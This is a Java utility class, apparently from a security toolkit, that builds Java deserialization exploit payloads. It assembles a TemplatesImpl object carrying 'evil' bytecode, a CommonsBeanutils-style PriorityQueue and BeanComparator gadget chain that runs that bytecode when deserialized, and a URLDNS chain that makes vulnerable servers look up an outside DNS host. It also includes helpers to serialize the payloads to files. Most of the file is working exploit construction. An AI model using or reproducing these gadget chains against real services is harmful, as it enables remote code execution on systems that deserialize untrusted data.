package expUtils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.PriorityQueue;
import java.util.Random;

import static expUtils.ReflectUtils.getClassByte;

public class ExpUtils {
    public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
        TemplatesImpl templates = new TemplatesImpl();
        ReflectUtils.setFields(templates,"_name","9eek");
        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");
//        byte[] evilCode = getObectClassByte(TemplatesEvilClass.class);
        byte[][] templatesEvilCode = new byte[][]{evilCode};
        ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
        ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());
//        templates.getOutputProperties();
        return templates;
    }
//    URLDNS链 带参数方式
    public static HashMap<Object,Object> getURLDNSChains(String targetUrl) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
        URL url = new URL(null,targetUrl,new SilenceURLHandler());
        hashMap.put(url,"1");
        ReflectUtils.setFields(url,"hashCode",-1);
//        ReflectUtils.setFields(url,"handler",new SilenceURLHandler());
        return hashMap;
    }

    // 获取一个对象的class byte文件
    public static byte[] getSerialObectClassByte(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(byteArrayOutputStream);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bufferedOutputStream);
        objectOutputStream.writeObject(obj);
        bufferedOutputStream.close();
//        byteArrayOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }

    //    URLDNS链 默认方式
    public static HashMap<Object,Object> getURLDNSChains() throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
        String prefix = String.valueOf(new Random().nextInt(100));
//        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
        String targetUrl  = "http://" + prefix + ".a.qq.com";
        return getURLDNSChains(targetUrl);
    }

//    序列化对象到特定路径
    public static String serialize(Object obj) throws IOException {
        String path = obj.getClass().getName() + ".ser";
        FileOutputStream fileOutputStream = new FileOutputStream(path);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        return path;
    }
//    反序列化特定路径文件为对象
    public static Object unserialize(String path) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(path);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
//        Object obj = objectInputStream.readObject();
//        System.out.println(obj);
        return objectInputStream.readObject();
    }
//    commonBean payload
    public static Object getCommonBeanExp() throws IllegalAccessException, NoSuchFieldException, IOException {
        TemplatesImpl evilTemplates = getEvilTemplates();
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> queue =  new PriorityQueue<Object>(2,beanComparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        ReflectUtils.setFields(beanComparator,"property","outputProperties");
        Field queueArr = ReflectUtils.getFields(queue,"queue");
        queueArr.setAccessible(true);
        Object[] obj = (Object[]) queueArr.get(queue);
        obj[0] = evilTemplates;
        obj[1] = evilTemplates;
        return queue;
    }
    //



    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
//        System.out.println(System.getProperty("user.dir"));
//        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");
//        System.out.println(evilCode.length);
//        byte[] aaa = getObectClassByte(TemplatesImpl.class);
//        System.out.println(aaa.length);
        getURLDNSChains();
    }
}
